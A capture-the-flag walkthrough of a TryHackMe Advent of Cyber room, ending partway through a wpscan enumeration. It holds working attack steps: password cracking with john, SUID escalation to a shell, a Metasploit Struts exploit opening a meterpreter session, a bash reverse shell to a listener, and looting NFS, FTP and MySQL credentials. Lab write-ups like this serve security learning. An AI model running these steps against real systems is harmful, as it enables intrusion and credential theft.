# Room
https://tryhackme.com/room/25daysofchristmas

# Task 1 - Intro
Intro

# Task 2 - Connect
Connect

# Task 3 - Points
Points

# Task 4 - Social
Social

# Task 5 - Kali Machine
Kali Machine

# Task 6 - Day 1
Presented with a web app and asked to login as mcinventory
* Noticed register option in web app, clicked register, registered a new user called mcinventory.  This web app is vulnerable to re-registration
* After registering, logged in as mcinventory with a password I created at registration
* Question 1 - cookie name
    * Loaded developer tools for my browser and went to Storage > Cookies and grabbed the name of the cookie
* Question 2 - decode the cookie
    * Copy cookie value and decode with the following
        ```
        echo "found_cookie" | base64 -d
        ```
* Question 3 - mcinventory's request
    * After logging in with mcinventory you can see the inventory item he requested

# Task 7 - Day 2
Discover the forum and login
* Question 1 - find hidden directory
    * Used gobuster
        ```
        gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.53.247:3000 -t 50 -x php,txt,html                               
        ===============================================================                                                                                                                            
        Gobuster v3.0.1                                                                                                                                                                            
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                            
        ===============================================================                                                                                                                            
        [+] Url:            http://10.10.53.247:3000                                                                                                                                               
        [+] Threads:        50                                                                                                                                                                     
        [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                           
        [+] Status codes:   200,204,301,302,307,401,403                                                                                                                                            
        [+] User Agent:     gobuster/3.0.1                                                                                                                                                         
        [+] Extensions:     php,txt,html                                                                                                                                                           
        [+] Timeout:        10s                                                                                                                                                                    
        ===============================================================                                                                                                                            
        2021/02/14 12:45:20 Starting gobuster                                                        
        ===============================================================    
        ```
* Question 2 - find the password
    * After finding the hidden directory I browsed to it and looked at the HTML source code.  In it was a comment about the author and repo where the page was based.  Pulling the repo up and the author provided a default username/password to allow us to connect
* Question 3 - what to take to the partay
    * Once you login with the default creds, there is mention of what you need to bring

# Task 8 - Day 3
A PCAP file is provided and you are asked to do some analysis on it
* Question 1 - find dst IP of packet 998
    * Open PCAP in wireshark and look for dst IP of packet 998
        ```
        frame.number == 998
        ```
* Question 2 - find Christmas list
    * Use the destination address you found in #1 as a filter
        ```
        ip.dst == [ip address]
        ```
* Question 3 - crack the password
    * Filter based on telnet to grab data
        ```
        telnet
        ```
    * Select telnet payload, right click > export packet bytes
    * Take payload data and crack
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt shadow 

        Using default input encoding: UTF-8
        Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
        Cost 1 (iteration count) is 5000 for all loaded hashes
        Will run 2 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        [removed]          (buddy)
        1g 0:00:00:00 DONE (2021-02-14 15:05) 7.142g/s 1828p/s 1828c/s 1828C/s 123456..freedom
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed
        ```

# Task 9 - Day 4
Linux navigation

* Question 1 - list files in a directory
    * ls -l
* Question 2 - display the contents of a file
    * cat file
* Question 3 - which file contains a string
    * grep [pattern] file*
* Question 4 - which file contains an IP address
    * egrep '([0-9]{1,3}\.[0-9]{1,3})' file*
* Question 5 - how many users can login to this machine
    * cat /etc/passwd | grep bash | wc -l
* Question 6 - what is the SHA1 hash of a file
    * cat file | sha1sum
* Question 7 - what is a user's password hash
    * look for shadow file backups
    * find / -name shadow* -type f 2>/dev/null

# Task 10 - Day 5
OSINT

Given an image use OSINT techniques to answer the questions.  Answers started with using exiftool to grab a username.  Search for that username on google to find social media.  Inside social media were links to other items of interest.  Also used Wayback Machine

# Task 11 - Day 6
Another PCAP is provided for analysis

* Question 1 - what was exfiltrated in DNS
    * set wireshark filter to dns
    * load CyberChef and paste finding
    * use Magic recipe
* Question 2 - Timmy's christmas
    * download the zip file from the PCAP
    * use zip2john to create a hash of the zip file
        ```
        zip2john christmaslists.zip > zip.hash
        ```
    * use john to crack the hash and then extract the contents
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
        ```
* Question 3 - hidden contents
    * download the JPG from the PCAP
    * use steghide to extract the hidden file
        ```
        steghide extract -sf TryHackMe.jpg
        ```

# Task 12 - Day 7
Enumerate the machine
* Question 1 - how many TCP ports under 1000 are open
    ```
    nmap -A -T4 10.10.93.9 -p 1-999 | tee nmap.txt
    ```
* Question 2 - what is the name of the OS on the host
    ```
    guess based on services running
    ```
* Question 3 - what version of SSH is running
    ```
    view nmap results
    ```
* Question 4 - location of hidden file
    * browse to main site, file is listed

# Task 13 - Day 8
SUID exploits
* Question 1 - find SSH port
    * run nmap
        ```
        nmap -A -T4 10.10.114.197 -p- | tee nmap.txt 
        ```
* Question 2 - search for files with SUID bit
    * search for files with SUID set
        ```
        find / -perm -u=s -type f 2>/dev/null
        ```
    * research findings against GTFOBins
    * notice one that stands out and run it
        ```
        holly@ip-10-10-114-197:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
        $ whoami
        igor
        $ cat /home/igor/flag1.txt
        ```
* Question 3 - find another file with SUID set and get root
    * review findings again
    * execute one of the files that looks different
        ```
        /usr/bin/system-control
        ```

# Task 14 - Day 9
Python

Create a script that assembles a flag based on changing directories and JSON responses.  The starting directory is /f, and the example JSON response is {"value":"s","next":"f"}.  Where "value" is a character in the flag and "next" is the next directory you need to GET.  Repeat the process until you encounter "end" in the "next" value, at which you'll have all the characters for the flag to solve the challenge
```
#!/usr/bin/python3

import requests
import time

url = "http://10.10.169.100:3000"

next_req = "f"
flag = ""

def get_url(url, next_req):
    current_url = url + "/" + next_req
    r = requests.get(current_url)
    print(current_url, r.status_code, r.json()['next'], r.json()['value'])
    flag_char = r.json()['value']
    next_req = r.json()['next']
    return [flag_char, next_req]

while next_req != "end":
    request_data = get_url(url, next_req)
    next_req = request_data[1]
    if next_req == "end":
        print("Reached the end")
        break
    flag += request_data[0]
    time.sleep(.001)

print("Your flag is {}".format(flag))
```

# Task 15 - Day 10
Compromise a web app using Metasploit

* Enumeration - nmap
    ```
    nmap -A -T4 10.10.78.17 | tee nmap.txt

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 18:51 EST
    Nmap scan report for 10.10.78.17
    Host is up (0.22s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 e8:dd:1c:ce:df:26:23:a9:76:b7:50:bd:96:56:cf:61 (RSA)
    |   256 1b:0f:f8:e4:d6:e4:ac:63:ee:57:32:58:72:9e:d8:ea (ECDSA)
    |_  256 55:65:5b:1e:f5:6c:91:53:22:d4:63:9a:58:a6:96:32 (ED25519)
    80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
    |_http-server-header: Apache-Coyote/1.1
    | http-title: Santa Naughty and Nice Tracker
    |_Requested resource was showcase.action
    111/tcp open  rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100024  1          53641/tcp   status
    |   100024  1          53698/udp6  status
    |   100024  1          56403/udp   status
    |_  100024  1          60529/tcp6  status

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
    ```
* Enumeration - metasploit - dir_scanner
    ```
    msf6 > search dir_scanner

    Matching Modules
    ================

    #  Name                                Disclosure Date  Rank    Check  Description
    -  ----                                ---------------  ----    -----  -----------
    0  auxiliary/scanner/http/dir_scanner                   normal  No     HTTP Directory Scanner


    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/dir_scanner

    msf6 > use 0
    
    
    msf6 auxiliary(scanner/http/dir_scanner) > set rhosts 10.10.78.17
    rhosts => 10.10.78.17

    
    msf6 auxiliary(scanner/http/dir_scanner) > set dictionary /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    dictionary => /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    
    
    msf6 auxiliary(scanner/http/dir_scanner) > run

    [*] Detecting error code
    [*] Using code '404' as not found for 10.10.78.17
    [+] Found http://10.10.78.17:80/# Copyright 2007 James Fisher/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# Attribution-Share Alike 3.0 License. To view a copy of this/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# Suite 300, San Francisco, California, 94105, USA./ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# on atleast 2 different hosts/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# or send a letter to Creative Commons, 171 Second Street,/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# This work is licensed under the Creative Commons/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# Priority ordered case sensative list, where entries were found/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# license, visit http://creativecommons.org/licenses/by-sa/3.0// 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/# directory-list-2.3-medium.txt/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/#/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80// 302 (10.10.78.17)
    [+] Found http://10.10.78.17:80/static/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/chat/ 302 (10.10.78.17)
    [+] Found http://10.10.78.17:80/ajax/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/interactive/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/person/ 302 (10.10.78.17)
    [+] Found http://10.10.78.17:80/conversion/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/wait/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/xslt/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/token/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/validation/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/video games/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/struts/ 200 (10.10.78.17)
    [+] Found http://10.10.78.17:80/spyware doctor/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/nero 7/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/long distance/ 400 (10.10.78.17)
    [+] Found http://10.10.78.17:80/cell phones/ 404 (10.10.78.17)
    ```
* Noticed /struts in dir_scanner output, search for struts in metasploit and try one
    ```
    msf6 auxiliary(scanner/http/dir_scanner) > search struts

    Matching Modules
    ================

    #   Name                                                     Disclosure Date  Rank       Check  Description
    -   ----                                                     ---------------  ----       -----  -----------
    0   exploit/multi/http/struts2_code_exec_showcase            2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
    1   exploit/multi/http/struts2_content_type_ognl             2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
    2   exploit/multi/http/struts2_multi_eval_ognl               2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
    3   exploit/multi/http/struts2_namespace_ognl                2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
    4   exploit/multi/http/struts2_rest_xstream                  2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
    5   exploit/multi/http/struts_code_exec                      2010-07-13       good       No     Apache Struts Remote Command Execution
    6   exploit/multi/http/struts_code_exec_classloader          2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
    7   exploit/multi/http/struts_code_exec_exception_delegator  2012-01-06       excellent  No     Apache Struts Remote Command Execution
    8   exploit/multi/http/struts_code_exec_parameters           2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
    9   exploit/multi/http/struts_default_action_mapper          2013-07-02       excellent  Yes    Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
    10  exploit/multi/http/struts_dev_mode                       2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
    11  exploit/multi/http/struts_dmi_exec                       2016-04-27       excellent  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
    12  exploit/multi/http/struts_dmi_rest_exec                  2016-06-01       excellent  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
    13  exploit/multi/http/struts_include_params                 2013-05-24       great      Yes    Apache Struts includeParams Remote Code Execution


    msf6 auxiliary(scanner/http/dir_scanner) > use 1
    [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp


    msf6 exploit(multi/http/struts2_content_type_ognl) > set rhosts 10.10.78.17
    rhosts => 10.10.78.17

    msf6 exploit(multi/http/struts2_content_type_ognl) > set targeturi /struts
    targeturi => /struts


    msf6 exploit(multi/http/struts2_content_type_ognl) > set lhost tun0
    lhost => tun0


    msf6 exploit(multi/http/struts2_content_type_ognl) > run

    [*] Started reverse TCP handler on a.b.c.d:4444 
    [*] Sending stage (3008420 bytes) to 10.10.78.17
    [*] Meterpreter session 1 opened (a.b.c.d:4444 -> 10.10.78.17:50424) at 2021-02-16 19:12:53 -0500

    meterpreter > 


    meterpreter > sysinfo
    Computer     : 172.17.0.2
    OS           : Debian 8.8 (Linux 4.14.146-93.123.amzn1.x86_64)
    Architecture : x64
    BuildTuple   : x86_64-linux-musl
    Meterpreter  : x64/linux


    meterpreter > getuid
    Server username: root @ 08b6c07cba6d (uid=0, gid=0, euid=0, egid=0)
    ```
* Setup listener
    ```
    nc -nvlp 6565
    listening on [any] 6565 ...
    ```
* Grab shell
    ```
    meterpreter > shell
    Process 69 created.
    Channel 1 created.

    bash -i >& /dev/tcp/a.b.c.d/6565 0>&1 
    ```
* Check listener
    ```
    connect to [a.b.c.d] from (UNKNOWN) [10.10.78.17] 43632
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@08b6c07cba6d:/usr/local/tomcat# 
    ```
* Search for first flag
    ```
    root@08b6c07cba6d:~# find / -iname *flag* -type f 2>/dev/null
    ```
* Find Santa's creds
    * Located in plaintext in /home/santa
* Login as Santa with the creds above
* Find text on certain lines in a file
    ```
    [santa@ip-10-10-78-17 ~]$ sed -n '148,148p' naughty_list.txt 
    [santa@ip-10-10-78-17 ~]$ sed -n '52,52p' nice_list.txt
    ```

# Task 16 - Day 11
Attack server services

* Enumeration - nmap
    ```
    nmap -A -T4 10.10.172.153 | tee nmap.txt                                          

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 20:09 EST                                                                       
    Nmap scan report for 10.10.172.153                                                                                                    
    Host is up (0.22s latency).                                                                                                           
    Not shown: 991 closed ports                                                                                                           
    PORT     STATE    SERVICE       VERSION                                                                                               
    21/tcp   open     ftp           vsftpd 3.0.2                                                                                          
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                
    |_Can't get directory listing: PASV failed: 500 OOPS: invalid pasv_address                                                            
    | ftp-syst:                                                                                                                           
    |   STAT:                                                                                                                             
    | FTP server status:                                                                                                                  
    |      Connected to a.b.c.d                                                                                                       
    |      Logged in as ftp                                                                                                               
    |      TYPE: ASCII                                                                                                                    
    |      No session bandwidth limit                                                                                                     
    |      Session timeout in seconds is 300                                                                                              
    |      Control connection is plain text                                                                                               
    |      Data connections will be plain text                                                                                            
    |      At session startup, client count was 2                                                                                         
    |      vsFTPd 3.0.2 - secure, fast, stable                                                                                            
    |_End of status                                                                                                                       
    111/tcp  open     rpcbind       2-4 (RPC #100000)                                                                                     
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  3           2049/udp   nfs
    |   100003  3           2049/udp6  nfs
    |   100003  3,4         2049/tcp   nfs
    100003  3           2049/udp6  nfs                                                                                                
    |   100003  3,4         2049/tcp   nfs                                                                                                
    |   100003  3,4         2049/tcp6  nfs                                                                                                
    |   100005  1,2,3      20048/tcp   mountd                                                                                             
    |   100005  1,2,3      20048/tcp6  mountd                                                                                             
    |   100005  1,2,3      20048/udp   mountd                                                                                             
    |   100005  1,2,3      20048/udp6  mountd
    |   100021  1,3,4      37891/tcp   nlockmgr
    |   100021  1,3,4      45925/tcp6  nlockmgr
    |   100021  1,3,4      52521/udp6  nlockmgr
    |   100021  1,3,4      60056/udp   nlockmgr
    |   100024  1          33663/tcp   status
    |   100024  1          35383/tcp6  status
    |   100024  1          45656/udp6  status
    |   100024  1          54095/udp   status
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl
    722/tcp  filtered unknown
    1984/tcp filtered bigbrother
    2049/tcp open     nfs_acl       3 (RPC #100227)
    2608/tcp filtered wag-service
    3077/tcp filtered orbix-loc-ssl
    3306/tcp open     mysql         MySQL 5.7.28
    | mysql-info: 
    |   Protocol: 10
    |   Version: 5.7.28
    |   Thread ID: 4
    |   Capabilities flags: 65535
    |   Some Capabilities: Support41Auth, LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, ODBCClient, SupportsTransactions, IgnoreSigpipes, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
    |   Status: Autocommit
    |   Salt: i=2!  \x03l81bKg\x02
    | \x0DeI\x10\x17
    |_  Auth Plugin Name: mysql_native_password
    | ssl-cert: Subject: commonName=MySQL_Server_5.7.28_Auto_Generated_Server_Certificate
    | Not valid before: 2019-12-10T23:10:36
    |_Not valid after:  2029-12-07T23:10:36
    |_ssl-date: TLS randomness does not represent time
    3737/tcp filtered xpanel
    Service Info: OS: Unix

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
    ```
* Enumeration - nmap - nfs
    ```
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.172.153

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 20:21 EST
    Nmap scan report for 10.10.172.153
    Host is up (0.22s latency).

    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-showmount: 
    |_  /opt/files *

    Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
    ```
* Gaining Access - access the nfs share
    ```
    sudo mkdir /mnt/tmpnfs

    sudo mount 10.10.172.153:/opt/files /mnt/tmpnfs

    ls -lrta /mnt/tmpnfs
    total 8
    -rwxrwxrwx 1 abc  abc    34 Dec 10  2019 creds.txt
    drwxrwxrwx 2 abc  abc    23 Dec 10  2019 .
    drwxr-xr-x 4 root root 4096 Feb 16 20:23 ..
    ```
* Enumeration - check anon ftp
    ```
    ftp 10.10.172.153
    Connected to 10.10.172.153.
    220 (vsFTPd 3.0.2)
    Name (10.10.172.153:abc): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls -lrta
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
    drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
    d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
    drwxr-xr-x    4 0        0              67 Dec 10  2019 .
    drwxr-xr-x    4 0        0              67 Dec 10  2019 ..
    -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
    226 Directory send OK.
    ftp> get file.txt
    local: file.txt remote: file.txt
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for file.txt (39 bytes).
    226 Transfer complete.
    39 bytes received in 0.00 secs (47.7866 kB/s)
    ftp> get welcome.msg
    local: welcome.msg remote: welcome.msg
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for welcome.msg (224 bytes).
    226 Transfer complete.
    224 bytes received in 0.00 secs (4.8551 MB/s)
    ftp> cd pub
    250 Directory successfully changed.
    ftp> ls -lrta
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        0               6 Nov 04  2019 .
    drwxr-xr-x    4 0        0              67 Dec 10  2019 ..
    226 Directory send OK.
    ftp> 
    ftp> cd ..
    250 Directory successfully changed.
    ftp> cd uploads
    250 Directory successfully changed.
    ftp> ls -lrta
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    226 Transfer done (but failed to open directory).
    ```
* Check anon ftp loot and found db creds
* Gaining Access - Connect to mysql remotely using db creds
    ```
    mysql -h 10.10.172.153 -u root -p

    Enter password: 
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MySQL connection id is 11
    Server version: 5.7.28 MySQL Community Server (GPL)

    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MySQL [(none)]> 
    ```
* Manual enumeration around mysql
    ```
    MySQL [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | data               |
    | mysql              |
    | performance_schema |
    | sys                |
    +--------------------+
    5 rows in set (0.222 sec)

    MySQL [(none)]> use data;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    MySQL [data]> show tables;
    +----------------+
    | Tables_in_data |
    +----------------+
    | USERS          |
    +----------------+
    1 row in set (0.223 sec)

    MySQL [data]> select * from USERS;
    +-------+--------------+
    | name  | password     |
    +-------+--------------+
    | admin | [removed]    |
    +-------+--------------+
    1 row in set (0.224 sec)

    MySQL [data]> quit
    Bye
    ```

# Task 17
Hashing and openssl

* Unzip files
    ```
    unzip tosend.zip 
    Archive:  tosend.zip
    extracting: note1.txt.gpg           
    extracting: note2_encrypted.txt     
    inflating: private.key             
    ```
* Use md5 sum to grab hash for the note
    ```
    cat note1.txt.gpg | md5sum
    [removed]
    ```
* With the password provided, use the private.key with the encrypted note to decrypt it
    ```
    openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out dec.txt
    Enter pass phrase for private.key:
    ```
# Task 18 
Attack a web application

* Enumeration - nmap
    ```
    nmap -A -T4 10.10.89.220 | tee nmap.txt
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 20:06 EST
    Nmap scan report for 10.10.89.220
    Host is up (0.22s latency).
    Not shown: 998 filtered ports
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: RETROWEB
    |   NetBIOS_Domain_Name: RETROWEB
    |   NetBIOS_Computer_Name: RETROWEB
    |   DNS_Domain_Name: RetroWeb
    |   DNS_Computer_Name: RetroWeb
    |   Product_Version: 10.0.14393
    |_  System_Time: 2021-02-18T01:06:55+00:00
    | ssl-cert: Subject: commonName=RetroWeb
    | Not valid before: 2021-02-17T01:06:21
    |_Not valid after:  2021-08-19T01:06:21
    |_ssl-date: 2021-02-18T01:06:58+00:00; +1s from scanner time.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
    ```
* Enumeration - gobuster
    ```
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.89.220 -t 50 -x txt,html,php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.89.220
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt,html,php
    [+] Timeout:        10s
    ===============================================================
    2021/02/17 20:08:09 Starting gobuster
    ===============================================================
    /retro (Status: 301)
    Progress: 5951 / 220561 (2.70%)
    ```
* Enumeration - gobuster
    ```
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.89.220/retro -t 50 -x txt,html,php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.89.220/retro
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt,html,php
    [+] Timeout:        10s
    ===============================================================
    2021/02/17 20:12:19 Starting gobuster
    ===============================================================
    /index.php (Status: 301)
    /wp-content (Status: 301)
    /wp-login.php (Status: 200)
    /license.txt (Status: 200)
    /Index.php (Status: 301)
    /wp-includes (Status: 301)
    /README.html (Status: 200)
    /readme.html (Status: 200)
    /LICENSE.txt (Status: 200)
    /wp-trackback.php (Status: 200)
    /INDEX.php (Status: 301)
    /License.txt (Status: 200)
    /wp-admin (Status: 301)
    /ReadMe.html (Status: 200)
    /Readme.html (Status: 200)
    ```
* Enumeration - wpscan
    ```
    wpscan --url http://10.10.89.220/retro --enumerate u
    _______________________________________________________________      
            __          _______   _____                                 
            \ \        / /  __ \ / ____|                                
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®               
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                
                \  /\  /  | |     ____) | (__| (_| | | | |               
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|               
                                                                        
            WordPress Security Scanner by the WPScan Team               
                            Version 3.8.14                              
        Sponsored by Automattic - https://automattic.com/             
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart               
    _______________________________________________________________      
                                                                        
    [i] It seems like you have not updated the database for some time.   
    [?] Do you want to update now? [Y]es [N]o, default: [N]y             
    [i] Updating the Database ...                                        
    [i] Update completed.                                                
                                                                        
    [+] URL: http://10.10.89.220/retro/ [10.10.89.220]                   
    [+] Started: Wed Feb 17 20:18:27 2021                                
                                                                        
    Interesting Finding(s):                                              
                                                                        
    [+] Headers                                                          
    | Interesting Entries:                                              
    |  - Server: Microsoft-IIS/10.0                                     
    |  - X-Powered-By: PHP/7.1.29                                       
    | Found By: Headers (Passive Detection)                             
    | Confidence: 100%    
                                                                                                                
    [+] XML-RPC seems to be enabled: http://10.10.89.220/retro/xmlrpc.php                                            
    | Found By: Direct Access (Aggressive Detection)                                                                
    | Confidence: 100%                                                                                              
    | References:                                                                                                   
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

    [+] WordPress readme found: http://10.10.89.220/retro/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://10.10.89.220/retro/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
    | Found By: Rss Generator (Passive Detection)
    |  - http://10.10.89.220/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
    |  - http://10.10.89.220/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

    [+] WordPress theme in use: 90s-retro                                                                                                                        
    | Location: http://10.10.89.220/retro/wp-content/themes/90s-retro/                                                                                                               
    | Latest Version: 1.4.10 (up to date)
    | Last Updated: 2019-04-15T00:00:00.000Z
    | Readme: http://10.10.89.220/retro/wp-content/themes/90s-retro/readme.txt
    | Style URL: http://10.10.89.220/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
    | Style Name: 90s Retro
    | Style URI: https://organicthemes.com/retro-theme/
    | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
    | Author: Organic Themes
    | Author URI: https://organicthemes.com
    |
    | Found By: Css Style In Homepage (Passive Detection)
    |
    | Version: 1.4.10 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - http://10.10.89.220/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

    [+] Enumerating All Plugins (via Passive Methods)

    [i] No plugins Found.

    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
    Checking Config Backups - Time: 00:00:01 <==========================================================================================================> (22 / 22) 100.00% Time: 00:00:01

    [i] No Config Backups Found.

    [+] Enumerating Users (via Passive and Aggressive Methods)
    Brute Forcing Author IDs - Time: 00:00:08 <=========================================================================================================> (10 / 10) 100.00% Time: 00:00:08

    [i] User(s) Identified:

    [+] wade
    | Found By: Author Posts - Author Pattern (Passive Detection)
    | Confirmed By:
    |  Wp Json Api (Aggressive Detection)
    |   - http://10.10.89.220/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
